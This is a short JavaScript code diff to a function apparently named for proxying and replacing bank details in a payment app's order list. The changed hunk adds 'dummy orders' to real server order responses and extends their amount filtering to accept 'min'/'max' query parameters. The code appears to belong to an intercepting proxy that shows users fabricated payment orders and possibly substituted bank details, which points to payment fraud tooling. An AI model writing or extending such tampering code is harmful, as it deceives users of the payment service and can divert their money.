@@ -2298,12 +2298,14 @@ async function proxyAndReplaceBankInList(req, res) {
 
     const listData = getResponseData(jsonResp);
     if (listData) {
+      // 1. Keep real server orders intact for all tabs (1000-10000, Top Picks, etc)
+      // 2. Only unshift dummy orders if added via /adddummy
       if (data.dummyOrders && Array.isArray(data.dummyOrders) && data.dummyOrders.length > 0 && req.originalUrl.includes('/app/payment/order') && !req.originalUrl.includes('/history') && !req.originalUrl.includes('orderInfo')) {
-        const qMin = parseFloat(req.query.minAmount || 0);
-        const qMax = parseFloat(req.query.maxAmount || 9999999);
+        const qMin = parseFloat(req.query.minAmount || req.query.min || 0);
+        const qMax = parseFloat(req.query.maxAmount || req.query.max || 9999999);
         const matchingDummies = data.dummyOrders.filter(d => {
           const amt = parseFloat(d.amount || d.orderAmount || 0);
-          if (req.query.minAmount || req.query.maxAmount) {
+          if (req.query.minAmount || req.query.maxAmount || req.query.min || req.query.max) {
             return amt >= qMin && amt <= qMax;
           }
           return true;
